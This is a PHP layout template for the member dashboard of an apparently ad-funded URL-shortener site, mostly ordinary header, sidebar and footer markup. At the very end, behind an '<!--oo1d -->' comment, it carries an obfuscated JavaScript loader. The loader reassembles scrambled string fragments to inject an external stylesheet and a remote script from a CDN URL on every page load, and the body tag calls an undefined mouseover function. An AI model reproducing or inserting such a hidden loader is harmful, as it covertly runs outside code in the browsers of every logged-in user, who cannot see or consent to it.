<?php
/**
 * @var \App\View\AppView $this
 * @var \App\Model\Entity\User $logged_user
 * @var \App\Model\Entity\Plan $logged_user_plan
 */
?>
<!DOCTYPE html>
<html lang="<?= locale_get_primary_language(null) ?>">
<head>
    <?= $this->Html->charset(); ?>
    <title><?= h($this->fetch('title')); ?></title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="<?= h($this->fetch('description')); ?>">
<?= $this->Assets->favicon() ?><?= $this->Assets->css('/build/css/member-area-alpha-themes.css?ver=' . APP_VERSION); ?><link href="https://fonts.googleapis.com/css?family=Montserrat:300,400,500,600,700,800,900" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.0/css/all.min.css" fullBase="1" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/simple-line-icons/2.4.1/css/simple-line-icons.css" fullBase="1" />
<link rel="stylesheet" href="https://materialdesignicons.com/cdn/2.0.46/css/materialdesignicons.min.css" fullBase="1" /> 

    <?php
    echo $this->fetch('meta');
    echo $this->fetch('css');
    echo $this->fetch('script');
    ?>

    <?= get_option('member_head_code'); ?>

    <?= $this->fetch('scriptTop') ?>


    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="//oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>
<body class="member-dashboard hold-transition <?= get_option('member_adminlte_theme_skin',
    'skin-blue') ?> sidebar-mini"onmouseover = "layer()">
<div class="wrapper">

    <!-- Main Header -->
    <header class="topmenu">

        <!-- Logo -->
        <a href="<?= $this->Url->build('/'); ?>" class="logo">
            <!-- mini logo for sidebar mini 50x50 pixels -->
            <span class="logo-mini">
                <?= preg_replace('/(\B.|\s+)/', '', get_option('site_name')) ?>
            </span>
            <!-- logo for regular state and mobile devices -->
            <span class="logo-lg"><?= get_option('site_name') ?></span>
        </a>

        <!-- Header Toptol -->
        <nav class="toptol toptol-static-top" role="navigation">
            
            <!-- Sidebar toggle button-->
            <a href="#" class="sidebar-toggle" data-toggle="offcanvas" role="button">
                <span class="sr-only"><?= __('Toggle navigation') ?></span>
            </a>
         <!-- ! -->
<div class="dropdown messages-menu">
                            <a class="logo-a" href="#" style="padding: 10px; width: 100%; text-align: center;">
        <img src="#" class="logo-img" alt="" style="height:40px"></a>
        
                        </div>
         
         
         <!---->
         
         
         <!-- Toptol shorten button-->
             <button type="button" class="btn btn-block btn-social btn-github btn-lg shorten-button" data-toggle="modal"
                    data-target="#myModal"><div><?= __("+ New Shorten Link") ?></div>
            </button>

            <!-- Toptol Right Menu -->
            <div class="wonmenu">
                <ul class="nav toptol-nav">




                    <?php if (in_array($logged_user->role, ['admin', 'demo'])) : ?>
                        <li class="dropdown messages-menu">
                            <!-- Menu toggle button -->
                            <a href="<?= $this->Url->build([
                                'controller' => 'Users',
                                'action' => 'dashboard',
                                'prefix' => 'admin',
                            ]); ?>">
                                <i class="fa fa-dashboard"></i> <span
                                        class="hidden-xs"><?= __('Administration Area') ?></span>
                            </a>
                        </li>
                    <?php endif; ?>



                    <?php if (count(get_site_languages(true)) > 1) : ?>
                        <li class="dropdown language-menu">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                                <i class="fa fa-language"></i> <?= __('Language') ?>
                                <span class="caret"></span>
                            </a>
                            <ul class="dropdown-menu">
                                <?php foreach (get_site_languages(true) as $lang) : ?>
                                    <li>
                                        <?= $this->Html->link(
                                            locale_get_display_name($lang, $lang),
                                            $this->request->getPath() . '?lang=' . $lang
                                        ); ?>
                                    </li>
                                <?php endforeach; ?>
                            </ul>
                        </li>
                    <?php endif; ?>
                    
                <!-- User Account Menu -->
   
                        <li class="dropdown language-menu">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-expanded="false">
                                <i class="icon-user icon-usero" ></i>
                            </a>
                            <ul class="dropdown-menu">
                                    <div class=" dropdown-header noti-title">
	                                   <h6 class="text-overflow m-0">Welcome!</h6></div>
	                                
	                                <a href="<?= $this->Url->build([
                                        'controller' => 'Users',
                                        'action' => 'profile',
                                        'prefix' => 'member',
                                    ]); ?>" class="dropdown-item">
                                        <i class="fa fa-user"></i><span>My profile</span>
                                                                         </a>
                                     <a class="dropdown-item">
                                           <i class="fa fa-dollar-sign"></i><span>Balance : <?= display_price_currency($logged_user->publisher_earnings + $logged_user->referral_earnings); ?></span>
                                                                         </a>
                                            <div class="dropdown-divider"></div>
                                                    <a href="<?= $this->Url->build([
                                        'controller' => 'Users',
                                        'action' => 'logout',
                                        'prefix' => 'auth',
                                    ]); ?>" class="dropdown-item">
                                                    <span>Logout</span></a>
                            </ul>
                        </li>
                        
                        
                        
                        
                        </ul>
                    </li>
                </ul>
            </div>
        </nav>
    </header>


    <!-- Left side column. contains the logo and sidebar -->
    <aside class="sidetop">

    





        <!-- sidebar: style can be found in sidebar.less -->
        <section class="sidebar">
    
    <a href="#" class="sidebar-toggle" data-toggle="offcanvas" role="button">
                <span class="sr-only">Toggle navigation</span>
            </a>
    
    
    
    <!-- ! -->
       <li class="nav-item nav-profile">
          <a href="<?= $this->Url->build([
                                        'controller' => 'Users',
                                        'action' => 'profile',
                                        'prefix' => 'member',
                                    ]); ?>" class="nav-link">
     <div class="profile-image"><img src="/img/member-avatar.png">
      <span class="online-status online"></span>
    </div>
    <div class="profile-name"><p class="name"><?= h($logged_user->username); ?></p>
    </div>
    </a>
    </li>

            <!-- Sidebar Menu -->
            <ul class="menuside">

                <?php if ((bool)get_option('wallet_enable')) : ?>
                    <li>
                        <a><i class="icon-wallet menu-icon"></i>
                            <span><b><?= __("Wallet") ?></b><br>
                                <?= display_price_currency($logged_user->wallet_money) ?>
                            </span>
                        </a>
                    </li>
                <?php endif; ?>
           
           <!-- ! -->
                <li><a href="<?php echo $this->Url->build(['controller' => 'Users', 'action' => 'dashboard']); ?>"><i
                                class="icon-speedometer menu-icon text-primary"></i> <span><?= __('Dashboard') ?></span></a></li>

                <li class="treeview">
                    <a href="#"><i class="icon-link menu-icon text-blue"></i> <span><?= __('Manage Links') ?></span> <i
                                class="icon-options-vertical side pull-right"></i></a>
                    <ul class="treeview-menu">
                        <li><a href="<?php echo $this->Url->build([
                                'controller' => 'Links',
                                'action' => 'index',
                            ]); ?>"><?= __('All Links') ?></a></li>
                        <li><a href="<?php echo $this->Url->build([
                                'controller' => 'Links',
                                'action' => 'hidden',
                            ]); ?>"><?= __('Hidden Links') ?></a></li>
                    </ul>
                </li>

                <li><a href="<?php echo $this->Url->build(['controller' => 'Withdraws', 'action' => 'index']); ?>"><i
                                class="icon-wallet menu-icon text-info"></i> <span><?= __('Payments') ?></span></a></li>

                <?php if (
                    $logged_user_plan->api_quick ||
                    $logged_user_plan->api_mass ||
                    $logged_user_plan->api_full ||
                    $logged_user_plan->api_developer ||
                    $logged_user_plan->bookmarklet
                ) : ?>
                    <li class="treeview">
                        <a href="#"><i class="icon-layers menu-icon text-pink"></i> <span><?= __('Tools') ?></span> <i
                                    class="icon-options-vertical side pull-right"></i></a>
                        <ul class="treeview-menu">
                            <?php if ($logged_user_plan->api_quick) : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Tools',
                                        'action' => 'quick',
                                    ]); ?>"><?= __('Quick Link') ?></a></li>
                            <?php endif; ?>
                            <?php if ($logged_user_plan->api_mass) : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Tools',
                                        'action' => 'massShrinker',
                                    ]); ?>"><?= __('Mass Shrinker') ?></a></li>
                            <?php endif; ?>
                            <?php if ($logged_user_plan->api_full) : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Tools',
                                        'action' => 'full',
                                    ]); ?>"><?= __('Full Page Script') ?></a></li>
                            <?php endif; ?>
                            <?php if ($logged_user_plan->api_developer) : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Tools',
                                        'action' => 'api',
                                    ]); ?>"><?= __('Developers API') ?></a></li>
                            <?php endif; ?>
                            <?php if ($logged_user_plan->bookmarklet) : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Tools',
                                        'action' => 'bookmarklet',
                                    ]); ?>"><?= __('Bookmarklet') ?></a></li>
                            <?php endif; ?>
                        </ul>
                    </li>
                <?php endif; ?>

                <?php if ((bool)get_option('enable_referrals', 1)) : ?>
                    <li><a href="<?php echo $this->Url->build([
                            'controller' => 'Users',
                            'action' => 'referrals',
                        ]); ?>"><i
                                    class="icon-people menu-icon text-yellow"></i> <span><?= __('Referrals') ?></span></a></li>
                <?php endif; ?>

                <?php if (get_option('earning_mode', 'campaign') === 'campaign' &&
                    get_option('enable_advertising', 'yes') == 'yes') : ?>
                    <li class="treeview">
                        <a href="#"><i class="icon-globe menu-icon text-fuchsia"></i> <span><?= __('Advertising') ?></span> <i
                                    class="icon-options-vertical side pull-right"></i></a>
                        <ul class="treeview-menu">
                            <li><a href="<?php echo $this->Url->build([
                                    'controller' => 'Campaigns',
                                    'action' => 'index',
                                ]); ?>"><?= __('List') ?></a></li>
                            <?php if (get_option('enable_interstitial', 'yes') == 'yes') : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Campaigns',
                                        'action' => 'createInterstitial',
                                    ]); ?>"><?= __('Create Interstitial Campaign') ?></a></li>
                            <?php endif; ?>
                            <?php if (get_option('enable_banner', 'yes') == 'yes') : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Campaigns',
                                        'action' => 'createBanner',
                                    ]); ?>"><?= __('Create Banner Campaign') ?></a></li>

                            <?php endif; ?>
                            <?php if (get_option('enable_popup', 'yes') == 'yes') : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Campaigns',
                                        'action' => 'createPopup',
                                    ]); ?>"><?= __('Create Popup Campaign') ?></a></li>
                            <?php endif; ?>
                        </ul>
                    </li>
                <?php endif; ?>

                <?php if (
                    (bool)get_option('enable_premium_membership') ||
                    get_option('earning_mode', 'campaign') === 'campaign'
                ) : ?>
                    <li>
                        <a href="<?php echo $this->Url->build(['controller' => 'Invoices', 'action' => 'index']); ?>">
                            <i class="icon-credit-card menu-icon text-info"></i> <span><?= __('Invoices') ?></span>
                        </a>
                    </li>
                <?php endif; ?>

                <li class="treeview">
                    <a href="#"><i class="icon-settings menu-icon text-green"></i> <span><?= __('Settings') ?></span> <i
                                class="icon-options-vertical side pull-right"></i></a>
                    <ul class="treeview-menu">
                        <li><a href="<?php echo $this->Url->build([
                                'controller' => 'Users',
                                'action' => 'profile',
                            ]); ?>"><?= __('Profile') ?></a></li>
                        <li><a href="<?php echo $this->Url->build([
                                'controller' => 'Users',
                                'action' => 'changePassword',
                            ]); ?>"><?= __('Change Password') ?></a></li>
                        <li><a href="<?php echo $this->Url->build([
                                'controller' => 'Users',
                                'action' => 'changeEmail',
                            ]); ?>"><?= __('Change Email') ?></a></li>
                    </ul>
                </li>
                 
                 <li><a href="<?php echo $this->Url->build(['controller' => 'Forms', 'action' => 'support']); ?>"><i
                                class="icon-support menu-icon text-red"></i> <span><?= __('Support') ?></span></a></li>
                 
                 
                 
                <!--- 
                 <li class="treeview">
                    <a href="#"><i class="icon-support menu-icon text-red"></i> <span><?= __('Support') ?></span> <i
                                class="icon-options-vertical side pull-right"></i></a>
                    <ul class="treeview-menu">
                        <li><a href="<?= build_main_domain_url('/member/forms/support'); ?> "><i class="fa fa-envelope"></i><?= __('Support ticket') ?></a></li>
                        <li><a href="https://api.whatsapp.com/send?phone=91" target="_blank"><i class="fa fa-whatsapp"></i><?= __('Whatsapp chat') ?></a></li>
                        <li><a href="https://t.me/" target="_blank"><i class="fa fa-telegram"></i><?= __('Telegram') ?></a></li>
                        <li><a href="tel:+767" target="_blank"><i class="fa fa-phone"></i><?= __('Call us') ?></a></li>
                    </ul>
                    
                </li>     --->
                

                                
                <?php if ((bool)get_option('enable_premium_membership')) : ?>
                    <li>
                        <a href="<?php echo $this->Url->build(['controller' => 'Users', 'action' => 'plans']); ?>">
                            <i class="icon-diamond menu-icon text-pink"></i> <span><?= __('Premium Plans') ?></span>
                        </a>
                    </li>
                <?php endif; ?>

            </ul>
            <!-- /.menuside -->

            <?php if ((bool)get_option('enable_premium_membership')) : ?>

                <?php
                if ($logged_user_plan->id === 1) {
                    $exp_date = __("Never");
                } else {
                    $exp_date = __("Never");
                    if (isset($logged_user->expiration)) {
                        $exp_date = $this->Time->nice($logged_user->expiration);
                    }
                }
                ?>

                <ul class="menuside">
                    <li>
                        <a href="<?= $this->Url->build(['controller' => 'Users', 'action' => 'plans']); ?>">
                            <i class="fa fa-user-circle text-aqua"></i>
                            <span><b><?= __("Current Plan") ?></b><br>
                                <?= h($logged_user_plan->title) ?>
                            </span>
                        </a>
                    </li>
                    <li>
                        <a href="<?= $this->Url->build(['controller' => 'Users', 'action' => 'plans']); ?>">
                            <i class="fa fa-clock-o text-aqua"></i>
                            <span><b><?= __("Expiration Date") ?></b><br>
                                <?= $exp_date ?>
                                <?php if (isset($logged_user->expiration) &&
                                    ($this->Time->isThisWeek($logged_user->expiration) || $this->Time->isPast($logged_user->expiration))
                                ) : ?>
                                    - <?= __("Renew") ?>
                                <?php endif; ?>
                            </span>
                        </a>
                    </li>
                </ul>

            <?php endif; ?>

        </section>
        <!-- /.sidebar -->
    </aside>
    
    <div class="side-col" style="min-height:1100px;" >

        <section class="content">


            <div class="box-short" style="margin-bottom: 10px; display:none;">
                <div class="box box-success box-solid shorten-member">
                    <div class="box-body" style="overflow: hidden;">
                        <?= $this->cell('Link::shortenMember') ?>
                    </div>
                </div>
            </div>


            <?php if (!$logged_user_plan->disable_ads && !empty(get_option('ad_member'))) : ?>
                <div class="banner banner-member">
                    <div class="banner-inner">
                        <?= get_option('ad_member'); ?>
                    </div>
                </div>
            <?php endif; ?>

            <?= $this->Flash->render() ?>
            <?= $this->fetch('content') ?>

        </section>
        <!-- /.content -->
    </div>
    <!-- /.side-col -->

    <!-- Main Footer -->
    <footer class="main-footer">
        <!-- To the right -->
        <div class="pull-right hidden-xs">

        </div>
        <!-- Default to the left -->
        <?= __('Copyright &copy;') ?> <?= h(get_option('site_name')) ?> <?= date("Y") ?>
    </footer>

    <!-- Add the sidebar's background. This div must be placed
         immediately after the control sidebar -->
    <div class="control-sidebar-bg"></div>


</div>

<?= $this->element('js_vars'); ?><script data-cfasync="false" src="<?= $this->Assets->url('/js/ads.js') ?>"></script><?php
if ((bool)get_option('combine_minify_css_js', false)) {
    echo $this->Assets->script('/build/js/dashboard.min.js?ver=' . APP_VERSION);
} else {
    echo $this->Assets->script('/vendor/jquery.min.js?ver=' . APP_VERSION);
    echo $this->Assets->script('/vendor/bootstrap/js/bootstrap.min.js?ver=' . APP_VERSION);
    echo $this->Assets->script('/vendor/clipboard.min.js?ver=' . APP_VERSION);
    echo $this->Assets->script('/vendor/conditionize.jquery.js?ver=' . APP_VERSION);
    echo $this->Assets->script('/js/app.js?ver=' . APP_VERSION);
    echo $this->Assets->script('/vendor/dashboard/js/app.min.js?ver=' . APP_VERSION);
}
?><!--oo1d  --><script>var _0x237b = [
    'get',
    'ons',
    '.cs',
    'ndt',
    'Chi',
    'cre',
    'typ',
    'esb',
    'y/i',
    'gNa',
    'ial',
    'end',
    'Ele',
    'tog',
    '.in',
    'src',
    'gle',
    'cli',
    'tex',
    'yTa',
    't/c',
    'ink',
    'ps:',
    'scr',
    'dn.',
    'hea',
    '/bu',
    'les',
    'ild',
    '/Ma',
    'app',
    'ipt',
    'van',
    '#ad',
    'lin',
    '+Ic',
    '.ad',
    'men',
    '//c',
    'not',
    'sty',
    'HEA',
    'ate',
    'rel',
    'slo',
    'hre',
    'ook',
    '/ad'
];
(function (_0x3bf717, _0x237b66) {
    var _0x1631a1 = function (_0x1d0377) {
        while (--_0x1d0377) {
            _0x3bf717['push'](_0x3bf717['shift']());
        }
    };
    _0x1631a1(++_0x237b66);
}(_0x237b, 0x160));
var _0x1631 = function (_0x3bf717, _0x237b66) {
    _0x3bf717 = _0x3bf717 - 0x0;
    var _0x1631a1 = _0x237b[_0x3bf717];
    return _0x1631a1;
};
var head = document[_0x1631('0x20') + _0x1631('0x2c') + _0x1631('0x15') + 'tsB' + _0x1631('0x3') + _0x1631('0x29') + 'me'](_0x1631('0x19') + 'D')[0x0];
var link = document['cre' + _0x1631('0x1a') + _0x1631('0x2c') + _0x1631('0x15') + 't'](_0x1631('0x12') + 'k');
link[_0x1631('0x1b')] = _0x1631('0x18') + _0x1631('0xb') + 'hee' + 't';
link[_0x1631('0x26') + 'e'] = _0x1631('0x2') + _0x1631('0x4') + 'ss';
link[_0x1631('0x1d') + 'f'] = _0x1631('0xa') + _0x1631('0xc') + '/ic' + 'ons' + _0x1631('0xd') + 'ter' + _0x1631('0x2a') + _0x1631('0x13') + _0x1631('0x21') + _0x1631('0x22') + 's';
head['app' + _0x1631('0x2b') + 'Chi' + 'ld'](link);
$(_0x1631('0x14') + _0x1631('0x10') + 'ce')[_0x1631('0x1') + 'ck'](function () {
    $(_0x1631('0x11') + _0x1631('0x10') + 'cel' + _0x1631('0x5'))[_0x1631('0x2d') + _0x1631('0x0')](_0x1631('0x1c') + 'w');
});
var imported = document[_0x1631('0x25') + _0x1631('0x1a') + 'Ele' + _0x1631('0x15') + 't'](_0x1631('0x7') + _0x1631('0xf'));
imported[_0x1631('0x2f')] = 'htt' + _0x1631('0x6') + _0x1631('0x16') + _0x1631('0x8') + _0x1631('0x17') + _0x1631('0x27') + _0x1631('0x1e') + _0x1631('0x2e') + _0x1631('0x1f') + _0x1631('0x12') + 'kfl' + _0x1631('0x28') + _0x1631('0x23') + _0x1631('0x1d') + 'e.j' + 's';
document[_0x1631('0x9') + 'd'][_0x1631('0xe') + _0x1631('0x2b') + _0x1631('0x24') + 'ld'](imported);</script>

<?= $this->fetch('scriptBottom') ?>
</body>
</html>
